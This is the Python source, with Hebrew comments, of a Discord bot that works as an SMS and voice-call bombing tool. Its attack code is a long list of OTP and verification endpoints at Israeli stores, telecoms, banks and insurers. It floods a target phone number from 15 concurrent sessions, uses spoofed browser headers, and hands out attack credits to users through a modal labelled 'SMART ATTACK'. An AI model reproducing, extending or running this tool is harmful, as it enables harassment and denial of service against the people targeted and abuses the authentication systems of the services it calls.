import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging
import json
import secrets
import time
import urllib.parse

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI or not TOKEN:
    logging.error("❌ Missing environment variables!")
    sys.exit(1)

# התחברות ל-MongoDB
try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
        self.active_attacks = {}
        self.last_update = {}
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"🔱 OMNI-TOTAL-WAR BOT IS ONLINE")

bot = CyberBot()

# ========== USER AGENTS ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/145.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 Chrome/146.0.0.0 Mobile Safari/537.36",
]

# ========== MAGENTO APIS - כל האתרים ==========
MAGENTO_APIS = [
    # מהרשימה המקורית
    {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Onot", "url": "https://www.onot.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento"},
    {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento"},
    {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "CrazyLine", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "magento"},
    {"name": "Adika", "url": "https://www.adikastyle.com/customer/ajax/post/", "type": "magento"},
    {"name": "Weshoes", "url": "https://www.weshoes.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "NineWest", "url": "https://www.ninewest.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Fix", "url": "https://www.fixunderwear.com/customer/ajax/post/", "type": "magento"},
    {"name": "Intima", "url": "https://www.intima-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Golf", "url": "https://www.golf-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "KiwiKids", "url": "https://www.kiwi-kids.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Story", "url": "https://www.storyonline.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nautica", "url": "https://www.nautica.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "LeeCooper", "url": "https://www.lee-cooper.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nike", "url": "https://www.nike.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Adidas", "url": "https://www.adidas.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Puma", "url": "https://www.puma.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "NewBalance", "url": "https://www.newbalance.co.il/customer/ajax/post/", "type": "magento"},
    
    # חדש - גולף קידס
    {"name": "GolfKids", "url": "https://www.golfkids.co.il/customer/ajax/post/", "type": "magento"},
    
    # חדש - Nine West (כבר יש אבל נוסיף שוב)
    {"name": "NineWest2", "url": "https://www.nine-west.co.il/customer/ajax/post/", "type": "magento"},
    
    # חדש - שטיינמצקי
    {"name": "Steimatzky", "url": "https://www.steimatzky.co.il/customer/ajax/post/", "type": "magento"},
    
    # חדש - Step In
    {"name": "StepIn", "url": "https://www.stepin.co.il/customer/ajax/post/", "type": "magento"},
    
    # חדש - Intima (כבר יש אבל נוסיף שוב)
    {"name": "Intima2", "url": "https://www.intima-il.co.il/customer/ajax/post/", "type": "magento"},
    
    # חדש - FixFixFixFix
    {"name": "FixFix", "url": "https://www.fixfixfixfix.co.il/customer/ajax/post/", "type": "magento"},
]

# ========== SMS APIS ==========
SMS_APIS = [
    # סלולר ותקשורת
    {"name": "Cellcom", "url": "https://www.cellcom.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Partner", "url": "https://www.partner.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Pelephone", "url": "https://www.pelephone.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "Hot", "url": "https://www.hotmobile.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "019", "url": "https://019sms.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "012", "url": "https://www.012.net.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "Bezeq", "url": "https://www.bezeq.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "Golan", "url": "https://www.golantelecom.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "019mobile", "url": "https://019mobile.co.il/userarea/ajax/api/", "type": "form", 
     "data": "request=login&action=firstLogin&data_arr%5Baction%5D=2&data_arr%5Bcontact%5D=PHONE"},
    
    # סופרים
    {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    {"name": "RamiLevi", "url": "https://www.rami-levy.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Victory", "url": "https://www.victory.co.il/api/auth/otp", "data": {"phone": "PHONE"}},
    {"name": "SuperPharm", "url": "https://www.super-pharm.co.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "GoodPharm", "url": "https://www.goodpharm.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Be", "url": "https://www.be.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Zap", "url": "https://www.zap.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "ZapShoes", "url": "https://www.zap-shoes.co.il/api/verify", "data": {"phone": "PHONE"}},
    
    # אוכל
    {"name": "10bis", "url": "https://www.10bis.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Wolt", "url": "https://www.wolt.com/api/v1/verify", "data": {"phone": "PHONE"}},
    {"name": "Wolt_v2", "url": "https://www.wolt.com/api/v2/verify", "data": {"phone": "PHONE"}},
    {"name": "WoltDelivery", "url": "https://www.wolt-delivery.com/api/auth", "data": {"phone": "PHONE"}},
    {"name": "Dominos", "url": "https://www.dominos.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "McDonalds", "url": "https://www.mcdonalds.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "BurgerKing", "url": "https://www.burgerking.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "KFC", "url": "https://www.kfc.co.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "PizzaHut", "url": "https://www.pizza-hut.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Subway", "url": "https://www.subway.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "BurgerAnch", "url": "https://app.burgeranch.co.il/_a/aff_otp_auth", "type": "form", "data": "phone=PHONE"},
    {"name": "Agva", "url": "https://www.agva.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Nishnush", "url": "https://www.nishnush.co.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "TacoBell", "url": "https://www.taco-bell.co.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "Arla", "url": "https://www.arla.co.il/api/verify", "data": {"phone": "PHONE"}},
    
    # שירותים
    {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register", "data": {"phone": "PHONE", "action": "send_sms"}},
    {"name": "Yad2_v2", "url": "https://www.yad2.co.il/api/v2/register", "data": {"phone": "PHONE", "action": "send_sms"}},
    {"name": "PayBox", "url": "https://payboxapp.com/api/auth/otp", "data": {"phone": "PHONE"}},
    {"name": "PayBox_v2", "url": "https://payboxapp.com/api/v2/auth", "data": {"phone": "PHONE"}},
    {"name": "PayBoxIR", "url": "https://paybox.ir/api/verify-phone", "data": {"phone": "PHONE"}},
    {"name": "Ivory", "url": "https://www.ivory.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "data": {"value": "PHONE", "type": "phone", "projectId": "1"}},
    {"name": "Mishloha", "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "data": {"phoneNumber": "PHONE"}},
    {"name": "Hopon", "url": "https://api.hopon.co.il/v0.15/1/isr/users", "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "phone": "PHONE", "phoneCall": False}},
    {"name": "Hopon_v2", "url": "https://api.hopon.co.il/v0.15/1/isr/users", "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "phone": "PHONE", "phoneCall": True}},
    {"name": "Isracart", "url": "https://www.isracart.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Bit", "url": "https://www.bit.co.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "TenBis", "url": "https://tenbis.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "Couponet", "url": "https://www.couponet.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "Rest", "url": "https://www.rest.co.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "Mashcantina", "url": "https://www.mashcantina.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Arabeska", "url": "https://www.arabeska.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "CarmelMarket", "url": "https://www.carmelmarket.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "PitzuiMarket", "url": "https://www.pitzuimarket.co.il/api/register", "data": {"phone": "PHONE"}},
    
    # בתי מלון
    {"name": "Isrotel", "url": "https://www.isrotel.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Fattal", "url": "https://www.fattal.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "DanHotels", "url": "https://www.danhotels.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    
    # תיירות
    {"name": "Lametayel", "url": "https://www.lametayel.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "Issta", "url": "https://www.issta.co.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "Gulliver", "url": "https://www.gulliver.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "TouristIsrael", "url": "https://www.tourist-israel.com/api/register", "data": {"phone": "PHONE"}},
    
    # אופנה
    {"name": "Fox", "url": "https://www.fox.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "TerminalX", "url": "https://www.terminalx.com/api/auth", "data": {"phone": "PHONE"}},
    {"name": "RixieMena", "url": "https://www.rixiemena.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "Decathlon", "url": "https://www.decathlon.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "FashionIsrael", "url": "https://www.fashionisrael.co.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "CastroAPI", "url": "https://www.castro.co.il/api/register", "data": {"phone": "PHONE"}},
    
    # תחבורה
    {"name": "Pango", "url": "https://api.pango.co.il/auth/otp", "data": {"phoneNumber": "PHONE_RAW"}},
    {"name": "Gett", "url": "https://www.gett.com/il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "Uzer", "url": "https://www.uzer.co.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "Moovit", "url": "https://moovit.com/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Waze", "url": "https://www.waze.com/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Blablacar", "url": "https://www.blablacar.co.il/api/register", "data": {"phone": "PHONE"}},
    
    # רכב
    {"name": "Hertz", "url": "https://www.hertz.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "Eldan", "url": "https://www.eldan.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "Sixt", "url": "https://www.sixt.co.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "Avis", "url": "https://www.avis.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Budget", "url": "https://www.budget.co.il/api/auth", "data": {"phone": "PHONE"}},
    
    # בתי עסק
    {"name": "Ikea", "url": "https://www.ikea.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "HomeCenter", "url": "https://www.home-center.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "Ace", "url": "https://www.ace.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "OfficeDepot", "url": "https://www.office-depot.co.il/api/sms", "data": {"phone": "PHONE"}},
    {"name": "MTN", "url": "https://www.mtn.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Yes", "url": "https://www.yes.co.il/api/verify", "data": {"phone": "PHONE"}},
]

# ========== VOICE APIS ==========
VOICE_APIS = [
    {"name": "Hapoalim", "url": "https://login.bankhapoalim.co.il/api/otp/send", "data": {"phone": "PHONE", "sendVoice": True}},
    {"name": "Leumi", "url": "https://api.leumi.co.il/api/otp/send", "data": {"phone": "PHONE", "voice": True}},
    {"name": "Discount", "url": "https://api.discountbank.co.il/auth/otp", "data": {"phone": "PHONE_RAW", "method": "voice"}},
    {"name": "Mizrahi", "url": "https://api.mizrahi-tefahot.co.il/auth/otp", "data": {"phone": "PHONE", "type": "voice"}},
    {"name": "Beinleumi", "url": "https://api.beinleumi.co.il/auth/send-otp", "data": {"phone": "PHONE", "channel": "voice"}},
    {"name": "Union", "url": "https://api.unionbank.co.il/auth/otp/voice", "data": {"phone": "PHONE"}},
    {"name": "Jerusalem", "url": "https://api.bank-jerusalem.co.il/auth/otp", "data": {"phone": "PHONE", "voice": True}},
    {"name": "Massad", "url": "https://api.massad.co.il/auth/otp/voice", "data": {"phone": "PHONE"}},
    {"name": "Yahav", "url": "https://api.yahav.co.il/auth/otp/voice", "data": {"phone": "PHONE"}},
    {"name": "Otsar", "url": "https://api.otsar.org.il/auth/otp/voice", "data": {"phone": "PHONE"}},
    {"name": "Postal", "url": "https://www.israelpost.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "OneZero", "url": "https://api.one-zero.com/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "CellcomVoice", "url": "https://digital-api.cellcom.co.il/api/otp/VoiceCall", "data": {"phone": "PHONE"}},
    {"name": "PartnerVoice", "url": "https://www.partner.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "PelephoneVoice", "url": "https://www.pelephone.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "HotVoice", "url": "https://www.hotmobile.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "BezeqVoice", "url": "https://www.bezeq.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "GolanVoice", "url": "https://www.golantelecom.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "ShufersalVoice", "url": "https://www.shufersal.co.il/api/v1/auth/voice", "data": {"phone": "PHONE_RAW"}},
    {"name": "RamiLeviVoice", "url": "https://www.rami-levy.co.il/api/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "PangoVoice", "url": "https://api.pango.co.il/auth/voice", "data": {"phoneNumber": "PHONE_RAW"}},
    {"name": "GettVoice", "url": "https://www.gett.com/il/api/voice", "data": {"phone": "PHONE"}},
    {"name": "Clal", "url": "https://api.clalbit.co.il/auth/otp/voice", "data": {"phone": "PHONE"}},
    {"name": "Harel", "url": "https://api.harel-group.co.il/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "Menora", "url": "https://api.menora.co.il/auth/otp/voice", "data": {"phone": "PHONE"}},
    {"name": "Phoenix", "url": "https://api.phoenix.co.il/auth/voice", "data": {"phone": "PHONE"}},
    {"name": "Migdal", "url": "https://api.migdal.co.il/auth/otp/voice", "data": {"phone": "PHONE"}},
]

# ========== QUICK LOGIN APIS ==========
QUICK_LOGIN_APIS = [
    {"name": "Quick24/7", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-twentyfourseven-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickRenuar", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-renuar-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickAldo", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-aldoshoes-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickBillabong", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-billabong-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickSacks", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-sacks-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickSteveMadden", "url": "https://oidc.quick-login.com/authorize", "data": {"client_id": "quicklogin-stevemadden-israel", "phone_number": "PHONE_INTL", "lang": "he"}},
    {"name": "QuickLogin", "url": "https://quick-login.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "QuickLoginAuth", "url": "https://login.quick-login.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "QuickMagento", "url": "https://magento.quick-login.co.il/rest/V1/guest-carts", "data": {"phone": "PHONE"}},
]

# שילוב הכל
ALL_APIS = MAGENTO_APIS + SMS_APIS + VOICE_APIS + QUICK_LOGIN_APIS
print(f"📊 טענתי {len(ALL_APIS)} APIs!")

# ========== פונקציות שליחה ==========
async def send_magento(session, url, phone_raw):
    """שליחת מג'נטו"""
    data = {
        "type": "login",
        "telephone": phone_raw,
        "bot_validation": 1,
        "code": "",
        "compare_email": "",
        "compare_identity": ""
    }
    
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "he,en-US;q=0.9,en;q=0.8",
        "Origin": url.replace("/customer/ajax/post/", ""),
        "Referer": url.replace("/customer/ajax/post/", "/") + "?srsltid=AfmBOorjiPfL8xlL2wbN4B1SyoNyoBNbZlRZ_9d4mse3wT0008dyPHNk",
        "Sec-Ch-Ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    }
    
    try:
        async with session.post(url, data=data, headers=headers, timeout=5) as resp:
            return True if resp.status in [200, 201, 202] else False
    except:
        return False

async def send_api(session, api, phone, phone_raw, phone_intl):
    """שליחת API"""
    try:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "he,en-US;q=0.9,en;q=0.8",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Ch-Ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin"
        }
        
        if api.get("type") == "form":
            headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
            data = api["data"].replace("PHONE", phone)
            async with session.post(api["url"], data=data, headers=headers, timeout=5) as resp:
                return resp.status in [200, 201, 202, 204]
        
        else:  # json
            headers["Content-Type"] = "application/json"
            data_str = json.dumps(api["data"])
            data_str = data_str.replace("PHONE", phone)
            data_str = data_str.replace("PHONE_RAW", phone_raw)
            data_str = data_str.replace("PHONE_INTL", phone_intl)
            data = json.loads(data_str)
            
            async with session.post(api["url"], json=data, headers=headers, timeout=5) as resp:
                return resp.status in [200, 201, 202, 204]
    except:
        return False

# ========== מתקפה חכמה ==========
async def smart_attack(phone, duration_mins, attack_type, user_id, interaction, attack_id):
    """מתקפה חכמה שמגוונת את השליחות"""
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    phone_intl = f"+972{phone_raw}"
    
    # בחירת APIs לפי סוג
    if attack_type == "magento":
        apis = [a for a in ALL_APIS if a.get("type") == "magento"]
    elif attack_type == "sms":
        apis = [a for a in ALL_APIS if a in SMS_APIS]
    elif attack_type == "voice":
        apis = [a for a in ALL_APIS if a in VOICE_APIS]
    else:
        apis = ALL_APIS
    
    # חלוקה לקבוצות
    random.shuffle(apis)
    api_groups = [apis[i:i+10] for i in range(0, len(apis), 10)]
    
    await interaction.followup.send(
        f"🎯 **SMART ATTACK**\n📱 {phone}\n⏱️ {duration_mins} דקות\n🎯 {len(apis)} APIs\n📊 {len(api_groups)} קבוצות",
        ephemeral=True
    )
    
    # 15 סשנים
    sessions = [aiohttp.ClientSession() for _ in range(15)]
    total_sent = 0
    group_index = 0
    last_update = 0
    
    end_time = datetime.now() + timedelta(minutes=duration_mins)
    
    try:
        while datetime.now() < end_time:
            if attack_id in bot.active_attacks and not bot.active_attacks[attack_id]:
                break
            
            current_group = api_groups[group_index % len(api_groups)]
            group_index += 1
            
            tasks = []
            for session in sessions:
                for api in current_group:
                    if api.get("type") == "magento":
                        tasks.append(send_magento(session, api["url"], phone_raw))
                    else:
                        tasks.append(send_api(session, api, phone, phone_raw, phone_intl))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            round_sent = sum(1 for r in results if r is True)
            total_sent += round_sent
            
            # עדכון כל 5 שניות
            seconds = int((datetime.now() - (end_time - timedelta(minutes=duration_mins))).total_seconds())
            if seconds > last_update and seconds % 5 == 0:
                last_update = seconds
                rate = total_sent // seconds if seconds > 0 else 0
                await interaction.followup.send(f"📊 {seconds}s: {total_sent} | {rate}/s", ephemeral=True)
            
            await asyncio.sleep(random.uniform(0.1, 0.2))
    
    finally:
        for session in sessions:
            await session.close()
    
    if attack_id in bot.active_attacks:
        del bot.active_attacks[attack_id]
    
    await interaction.followup.send(f"✅ **FINISHED**\n📊 סה\"כ: {total_sent}", ephemeral=True)

# ========== פקודת בדיקה ==========
@bot.tree.command(name="check", description="בדוק APIs")
async def check_command(interaction: discord.Interaction):
    await interaction.response.send_message("🔍 בודק 20 APIs ראשונים...", ephemeral=True)
    
    test_phone = "972501234567"
    test_raw = "0501234567"
    test_intl = "+972501234567"
    
    working = []
    
    async with aiohttp.ClientSession() as session:
        for i, api in enumerate(ALL_APIS[:20]):
            try:
                if api.get("type") == "magento":
                    success = await send_magento(session, api["url"], test_raw)
                else:
                    success = await send_api(session, api, test_phone, test_raw, test_intl)
                
                if success:
                    working.append(api["name"])
                    print(f"✅ {api['name']} עובד")
                else:
                    print(f"❌ {api['name']} לא עובד")
            except Exception as e:
                print(f"⚠️ {api['name']} שגיאה: {e}")
            
            await asyncio.sleep(0.1)
    
    await interaction.followup.send(f"✅ **{len(working)}** עובדים:\n" + "\n".join(working[:10]), ephemeral=True)

@bot.tree.command(name="stop", description="עצור הכל")
async def stop_command(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    stopped = 0
    for attack_id in list(bot.active_attacks.keys()):
        if attack_id.startswith(user_id):
            bot.active_attacks[attack_id] = False
            stopped += 1
    await interaction.response.send_message(f"🛑 עצרתי {stopped} מתקפות", ephemeral=True)

# ========== VIEW ==========
class AttackModal(ui.Modal, title="🎯 SMART ATTACK"):
    phone = ui.TextInput(label="📱 טלפון", placeholder="972501234567")
    duration = ui.TextInput(label="⏱️ דקות", default="3")
    attack_type = ui.TextInput(label="🎯 סוג", default="all", placeholder="all/sms/voice/magento")

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        attack_type = self.attack_type.value.strip().lower()
        
        if not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב 972", ephemeral=True)
            return
        
        try:
            duration = int(self.duration.value)
            if duration < 1 or duration > 30:
                await interaction.response.send_message("❌ 1-30 דקות", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ מספר לא תקין", ephemeral=True)
            return
        
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        if not user_doc:
            await users_col.insert_one({"user_id": user_id, "tokens": 10000})
            user_doc = {"tokens": 10000}
        
        if user_doc.get("tokens", 0) < 1:
            await interaction.response.send_message("❌ אין טוקנים", ephemeral=True)
            return
        
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        bot.active_attacks[attack_id] = True
        
        await interaction.response.send_message(
            f"🎯 **ACTIVATED!**\n📱 {phone}\n💎 נותרו: {user_doc['tokens']-1}",
            ephemeral=True
        )
        
        asyncio.create_task(smart_attack(phone, duration, attack_type, user_id, interaction, attack_id))

class MainView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)
    
    @discord.ui.button(label="🎯 SMART ATTACK", style=discord.ButtonStyle.danger)
    async def attack_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(AttackModal())
    
    @discord.ui.button(label="🔍 CHECK", style=discord.ButtonStyle.secondary)
    async def check_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await check_command(interaction)
    
    @discord.ui.button(label="🛑 STOP", style=discord.ButtonStyle.secondary)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await stop_command(interaction)

@bot.tree.command(name="setup", description="פאנל שליטה")
async def setup(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    
    if not user_doc:
        await users_col.insert_one({"user_id": user_id, "tokens": 100000})
        tokens = 100000
    else:
        tokens = user_doc.get("tokens", 0)
    
    active = len([a for a in bot.active_attacks if a.startswith(user_id) and bot.active_attacks[a]])
    
    embed = discord.Embed(
        title="🎯 MEGA ULTIMATE EDITION",
        description=f"**{len(ALL_APIS)}** APIs | 15 סשנים | 100-200ms",
        color=0xff0000
    )
    embed.add_field(name="💎 טוקנים", value=f"**{tokens}**")
    embed.add_field(name="🎯 פעיל", value=active)
    embed.add_field(name="📊 סוגים", value=f"{len(MAGENTO_APIS)} מג'נטו | {len(SMS_APIS)} SMS | {len(VOICE_APIS)} Voice")
    
    await interaction.response.send_message(embed=embed, view=MainView())

if __name__ == "__main__":
    print(f"🎯 טוען {len(ALL_APIS)} APIs...")
    bot.run(TOKEN)
